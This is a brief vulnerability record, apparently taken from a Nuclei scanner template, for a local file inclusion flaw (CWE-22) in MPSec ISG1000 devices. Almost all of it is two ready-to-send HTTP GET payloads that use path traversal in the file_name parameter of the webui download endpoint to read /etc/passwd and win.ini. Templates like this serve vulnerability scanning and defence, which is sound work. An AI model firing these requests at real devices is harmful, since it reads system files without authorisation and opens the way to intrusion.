# Vulnerability: MPSec ISG1000 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`mpsec-lfi.yaml`)

## Description
MPSec ISG1000 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
GET {{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
```

